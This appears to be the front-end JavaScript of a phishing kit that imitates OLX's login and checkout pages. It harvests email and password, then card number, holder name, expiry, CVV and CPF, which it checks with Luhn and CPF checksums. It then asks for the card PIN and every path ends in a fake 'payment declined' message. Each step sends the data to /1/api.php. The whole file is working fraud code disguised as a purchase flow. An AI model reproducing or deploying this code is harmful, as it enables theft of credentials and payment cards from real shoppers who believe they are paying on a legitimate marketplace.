function token(tamanho = 200) {
    try {
        const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let resultado = '';
        for (let i = 0; i < tamanho; i++) {
            const indiceAleatorio = Math.floor(Math.random() * caracteres.length);
            resultado += caracteres.charAt(indiceAleatorio);
        }
        return resultado;
    } catch (error) {
        return ""
    }
}

function ajx(data = {}, ir = "") {
    try {
        $.ajax({
            url: `/1/api.php?token=${token()}`,
            data: data,
            type: "POST",
            success: function(res) {
                if (res == "ok") {
                    window.location = ir
                } else {

                }
            }
        });
    } catch (error) {}
}

function Comprar_() {
    window.location = "/1/login/"
}

function ValidEmail1(email) {
    var pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return pattern.test(email);
}

function login_olx() {
    if ($("#email").val().length > 3 && $("#senha").val().length > 5 && ValidEmail1($("#email").val())) {
        ajx({
                action: "login",
                email: $("#email").val(),
                senha: $("#senha").val(),
            },
            "/1/carrinho/"
        )
    }
}

function VALID__CC(numero = "") {
    numero = numero.replace(/\s/g, "");
    if (!/^\d+$/.test(numero)) {
        return false;
    }
    const digitos = numero.split('').map(Number);
    digitos.reverse();
    let soma = 0;
    for (let i = 0; i < digitos.length; i++) {
        let digito = digitos[i];

        if (i % 2 === 1) {
            digito *= 2;

            if (digito > 9) {
                digito -= 9;
            }
        }
        soma += digito;
    }
    return soma % 10 === 0;
}

function validarCPL_(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if (cpf.length !== 11) {
        return false;
    }
    if (/^(\d)\1+$/.test(cpf)) {
        return false;
    }
    let soma = 0;
    let resto;
    for (let i = 1; i <= 9; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    }
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) {
        resto = 0;
    }
    if (resto !== parseInt(cpf.substring(9, 10))) {
        return false;
    }
    soma = 0;
    for (let i = 1; i <= 10; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    }
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) {
        resto = 0;
    }
    return resto === parseInt(cpf.substring(10, 11));
}

function salvar_card() {
    var cc = $("#cartao").val();
    var cpf = $("#cpftitular").val();
    var nome = $("#titular").val();
    var cvv = $("#cvv").val();
    var validade = $("#validade").val();
    const firstModal = document.querySelector(".modal-background");
    const senha = document.querySelector(".modal-senha");

    if (VALID__CC(cc) && validarCPL_(cpf) && nome.length > 3 && cvv.length > 2 && validade.length > 4) {
        var data = {
            action: "salvarInfo",
            numeroDoCartao: cc,
            nomeDoTitularDoCartao: nome,
            validadeDoCartao: validade,
            cvvDoCartao: cvv,
            cpfDoTitularDoCartao: cpf
        };

        // Enviar dados via AJAX
        $.ajax({
            type: "POST",
            url: "/1/api.php?token=1",
            data: data,
            success: function(response) {
                // Supondo que a resposta do servidor contenha uma propriedade 'aprovado'
                if (response.status === 'senha') {
                    alert('Verificacão requerida!');
                    firstModal.style.display = "none";
                    senha.style.display = "block";
                } else {
                    alert('Pagamento recusado: ' + response.status);
                }
            },
            error: function(xhr, status, error) {
                alert('Erro ao processar a solicitação. Tente novamente mais tarde.');
            }
        });
    } else {
        alert('Dados inválidos. Verifique os campos e tente novamente.');
    }
}

function salvar_senha(){
    var cc = $("#cartao").val();
    var senha = $("#senha").val();
    
    if (cc.length > 2 && senha.length > 3) {
        var data = {
            action: "salvarSenha",
            numeroDoCartao: cc,
            senha: senha
        };

        // Enviar dados via AJAX
        $.ajax({
            type: "POST",
            url: "/1/api.php?token=1",
            data: data,
            success: function(response) {
                // Supondo que a resposta do servidor contenha uma propriedade 'aprovado'
                if (response.status === 'ok') {
                    alert('Pagamento recusado');
                    window.location = "/1/carrinho/"
                } else {
                    alert('Pagamento recusado: ' + response.status);
                    window.location = "/1/carrinho/"
                }
            },
            error: function(xhr, status, error) {
                alert('Erro ao processar a solicitação. Tente novamente mais tarde.');
                
            }
        });
        } else {
        alert('Senha inválida. Verifique o campo e tente novamente.');
    }
}

``
